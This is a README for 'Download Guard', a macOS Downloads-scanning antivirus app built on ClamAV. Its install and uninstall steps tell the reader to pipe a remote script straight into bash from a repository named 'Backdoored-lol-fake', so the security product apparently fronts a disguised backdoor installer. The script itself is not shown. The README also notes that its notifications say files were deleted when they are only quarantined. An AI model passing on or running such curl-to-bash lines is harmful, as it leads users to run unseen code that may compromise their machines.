# Download Guard for macOS

Download Guard is a clickable macOS app with a background Downloads monitor. It scans files locally with ClamAV and moves detections into quarantine rather than permanently deleting them.

## Install

Open Terminal and run:

```bash
curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/install.sh | bash
```

If Homebrew is missing, the installer asks before using Homebrew's official installer. It installs ClamAV, updates signatures, registers the background monitor, and creates **`~/Applications/Download Guard.app`**. Open it from your Applications folder like a normal Mac app. The monitor also starts automatically when you log in.

## Scanning

- First start: scans files already in `~/Downloads`.
- Later: skips unchanged files using local scan history; new or changed files are scanned.
- Files are scanned locally and are not uploaded by this app.
- Scan errors are not treated as clean results; affected files remain untouched and are retried.
- Detections move to `~/Library/Application Support/DownloadGuard/Quarantine`.
- The notification text says “Deleted 1 malware!”, but the file is quarantined, not permanently erased.

## Locations

- App: `~/Applications/Download Guard.app`
- Logs: `~/Library/Application Support/DownloadGuard/Logs`
- Quarantine: `~/Library/Application Support/DownloadGuard/Quarantine`

No antivirus can guarantee detection of every threat. Keep macOS and ClamAV signatures updated.

## Uninstall

```bash
curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/uninstall.sh | bash
```
